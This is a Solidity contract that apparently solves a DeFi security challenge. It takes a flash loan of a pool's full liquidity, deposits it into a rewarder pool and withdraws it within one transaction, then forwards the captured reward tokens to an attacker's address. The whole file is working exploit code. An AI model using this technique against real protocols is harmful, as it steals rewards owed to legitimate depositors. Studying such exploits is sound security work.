
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IRewarderPool {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
	function rewardToken() external view returns (IERC20);
	
}

interface IFlashLoanPool {
	function flashLoan(uint256 amount) external;
	function liquidityToken() external view returns (IERC20);
}


contract RewarderExploitDeployer {
	constructor(address poolAddress, address rewardAddress, address attacker){
		RewarderExploit rewarderExploit = new RewarderExploit(poolAddress, rewardAddress, attacker);
		rewarderExploit.attack();
	}
}
contract RewarderExploit {
	IFlashLoanPool public pool;
	IRewarderPool public reward;
    address public attackerEOA;
	
	constructor (address poolAddress, address rewardAddress, address attacker) {
		pool = IFlashLoanPool(poolAddress);
		reward = IRewarderPool(rewardAddress);
		attackerEOA = attacker;
		}
	
	function attack() external {

        uint256 amount = pool.liquidityToken().balanceOf(address(pool));
		pool.flashLoan(amount);
        
        uint256 eoaAmount = reward.rewardToken().balanceOf(address(this));
        reward.rewardToken().transfer(attackerEOA, eoaAmount);

    }
	function receiveFlashLoan(uint256 amount) external {
		pool.liquidityToken().approve(address(reward), amount);
		reward.deposit(amount);
		reward.withdraw(amount);
		pool.liquidityToken().transfer(address(pool),amount);
 
	}
}